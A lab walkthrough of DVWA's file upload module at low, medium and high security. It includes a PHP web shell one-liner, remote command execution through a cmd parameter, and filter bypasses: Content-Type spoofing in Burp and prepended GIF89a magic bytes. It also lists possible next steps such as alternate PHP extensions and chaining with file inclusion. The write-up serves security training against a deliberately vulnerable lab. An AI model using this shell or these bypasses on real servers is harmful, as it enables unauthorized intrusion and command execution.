# DVWA: Unrestricted File Upload (Low → Medium → High)

A walkthrough of DVWA's File Upload module across all three security levels,
showing how the bypass technique has to evolve as server-side filtering gets
stricter.

**Target:** DVWA (`localhost/vulnerabilities/upload/`)
**Payload used throughout:**
```php
<?php system($_REQUEST[cmd]); ?>
```
Saved locally as `anup.php` and used as the base file for every upload attempt.

---

## Security Level: Low

At Low, DVWA applies **no server-side validation at all**. Any file type is accepted as-is.

### Step 1: Analyze the Upload Functionality

Navigate to the **File Upload** section and inspect the form to see how the
application handles submitted files, whether it checks file extension, MIME
type, or content.

`![Low - upload page](./images/low-01-upload-page.png)`

### Step 2: Select and Upload the Payload

Select the PHP web shell (`anup.php`) via the file picker and submit it through the form.

`![Low - selecting anup.php in file picker](./images/low-02-file-picker.png)`

`![Low - anup.php selected, ready to upload](./images/low-03-file-selected.png)`

### Step 3: Confirm the Vulnerability, No Filtering + Path Disclosure

The upload succeeds with no restriction whatsoever. The application also
discloses the **exact storage path** of the uploaded file in its response:

```
../../hackable/uploads/anup.php succesfully uploaded!
```

This is a secondary issue on its own, path disclosure. Even if upload
restrictions existed, telling the attacker exactly where the file landed
removes the need to guess or brute-force the path.

`![Low - upload success message revealing the storage path](./images/low-04-upload-success-path.png)`

### Step 4: Access the Uploaded Payload

Navigate directly to the disclosed path:
```
http://localhost/hackable/uploads/anup.php
```
The server parses `.php` files inside the uploads directory, so the script
executes. A blank page is expected here since the shell has no `cmd` parameter yet.

`![Low - navigating to the uploaded PHP file](./images/low-05-blank-execution.png)`

### Step 5: Achieve Remote Code Execution

Append the `cmd` parameter to interact with the shell:
```
http://localhost/hackable/uploads/anup.php?cmd=ls /
```
The root directory listing is returned, confirming full **Remote Code
Execution (RCE)**.

`![Low - RCE confirmed via cmd parameter](./images/low-06-rce-confirmed.png)`

**Low level: complete.**

---

## Security Level: Medium

At Medium, DVWA adds a filter, but it only checks the **`Content-Type` header**
sent by the browser during upload. It does **not** inspect the actual file
extension or file contents.

### Step 1: Check the Upload Form

`![Medium - upload page](./images/medium-01-upload-page.png)`

### Step 2: Attempt a Direct PHP Upload

Try submitting `anup.php` as-is, no manipulation, to see whether the raw
upload is now blocked.

`![Medium - selecting a file to upload](./images/medium-02-file-picker.png)`

The response confirms a filter is now active:
```
Your image was not uploaded. We can only accept JPEG or PNG images.
```

`![Medium - upload rejected, JPEG or PNG only](./images/medium-03-rejected-content-type.png)`

### Step 3: Identify What's Actually Being Checked

Intercept the upload request in Burp Suite. The relevant part of the
multipart body looks like this:
```
Content-Disposition: form-data; name="uploaded"; filename="anup.php"
Content-Type: application/x-php
```
This confirms the server is validating the **`Content-Type` header**, not the
real file extension or file signature.

### Step 4: Bypass via Header Manipulation

In Burp Repeater, manually change the `Content-Type` header from
`application/x-php` to `image/jpeg`, keeping the filename and PHP payload unchanged:
```
Content-Disposition: form-data; name="uploaded"; filename="anup.php"
Content-Type: image/jpeg
```

`![Medium - Burp request with Content-Type spoofed to image/jpeg](./images/medium-04-burp-content-type-bypass.png)`

The server is fooled into accepting the file as a harmless image and stores it.

### Step 5: Confirm Upload and Locate the Shell

The application again discloses the storage path:
```
../../hackable/uploads/anup.php succesfully uploaded!
```

`![Medium - upload success, path disclosed](./images/medium-05-upload-success-path.png)`

### Step 6: Execute the Shell and Confirm RCE

Navigate to the uploaded file and pass a command:
```
http://localhost/hackable/uploads/anup.php?cmd=ls
```

`![Medium - directory listing via cmd parameter](./images/medium-06-cmd-ls.png)`

A broader listing confirms full system access:
```
http://localhost/hackable/uploads/anup.php?cmd=ls +/
```

`![Medium - root directory listing confirms RCE](./images/medium-07-root-listing.png)`

**Medium level: complete.** Key takeaway: `Content-Type` is a client-supplied,
trivially spoofable header. It should never be trusted as the sole file-type check.

---

## Security Level: High

At High, DVWA tightens validation further. This level rejects uploads based
on more than just the `Content-Type` header, both the **file extension** and
the **file's magic bytes** (file signature) appear to be checked.

### Step 1: Confirm the Filter Is Stronger

Attempt to upload `anup.php` directly (no manipulation). Result: rejected,
same message as Medium:
```
Your image was not uploaded. We can only accept JPEG or PNG images.
```

`![High - rejected, JPEG or PNG only](./images/high-02-rejected.png)`

### Step 2: Test Whether Content-Type Spoofing Alone Still Works

Repeat the Medium-level bypass, keep the `.php` extension, but change
`Content-Type` to `image/jpeg` in Burp.

`![High - Burp request, .php extension + spoofed Content-Type, still rejected](./images/high-03-content-type-only-fails.png)`

**Result: still rejected.** This confirms High is doing more than a
`Content-Type` check, the file extension itself is also being validated.

### Step 3: Test With a `.jpg` Extension (No Magic Bytes Yet)

Rename the upload's filename to `anup.jpg`, keep `Content-Type: image/jpeg`,
but leave the raw PHP payload as the file body with no image file signature.

`![High - filename anup.jpg, image/jpeg content-type, no magic bytes](./images/high-04-jpg-no-magic-bytes.png)`

**Result: still rejected.** This indicates the server is also checking the
file's actual content, specifically, the file signature (magic bytes) at
the start of the file, not just its name or declared type.

### Step 4: Add Valid Magic Bytes

Prepend the GIF magic byte signature (`GIF89a`) to the start of the payload,
before the PHP code, while keeping the filename as `anup.jpg` and
`Content-Type: image/jpeg`:

```
GIF89a
<?php system($_REQUEST[cmd]); ?>
```

`![High - Burp request with GIF89a magic bytes prepended](./images/high-05-magic-bytes-bypass.png)`

**Result: upload succeeds.**
```
../../hackable/uploads/anup.jpg succesfully uploaded!
```

This confirms all three checks at this level: `Content-Type` header, file
extension, and file signature/magic bytes, have now been satisfied
simultaneously.

### Step 5: Attempt Execution (In Progress)

Navigating to the uploaded file:
```
http://localhost/hackable/uploads/anup.jpg?cmd=ls
```
The PHP code does **not** execute. This is expected: the file was uploaded
successfully as a `.jpg`, but the web server is not configured to interpret
`.jpg` files as PHP, so the payload is served as inert text/image content
rather than executed.

**Where this leaves off:** the file-type/content filter has been fully
bypassed for *upload*, but execution still requires the server to actually
parse the uploaded file as PHP. Next steps to explore for full RCE at High level:

- [ ] Test alternate executable extensions the server might still parse as PHP
      (`.phtml`, `.php5`, `.pht`, double extensions like `.php.jpg`)
- [ ] Check whether DVWA's **File Inclusion** module can be chained here, use
      Local File Inclusion to include and execute the uploaded `.jpg` as PHP,
      even though the web server won't execute it directly by extension
- [ ] Check the web server config (Apache `.htaccess` / `mod_php` handler
      mapping) for any additional extensions mapped to the PHP handler

**High level: upload restriction bypassed, code execution not yet achieved. To be continued.**

---

## Summary Table

| Level | Filter in place | Bypass technique |
|---|---|---|
| Low | None | Direct upload, no changes needed |
| Medium | `Content-Type` header only | Spoof `Content-Type` to `image/jpeg` in Burp |
| High | `Content-Type` + extension + magic bytes | Rename to `.jpg`, spoof `Content-Type`, prepend `GIF89a` magic bytes, upload succeeds but execution still blocked by extension handling |

## Key Lessons

- **Never trust client-supplied headers** (`Content-Type`) for file validation, it's
  fully attacker-controlled
- **Extension whitelisting must be paired with content validation**, checking
  the extension alone (or even the magic bytes alone) is insufficient
- **Disclosing the upload storage path** in the response (as DVWA does at
  every level here) removes the need for an attacker to guess file locations,
  this alone should be treated as a finding
- Even when upload validation is fully bypassed, **execution still depends on
  server configuration** (which extensions the web server hands off to the
  PHP interpreter), a secure server should never execute code from a
  directory intended only for image uploads, regardless of what extension is used

---

*Lab: DVWA (Damn Vulnerable Web Application), File Upload module.*
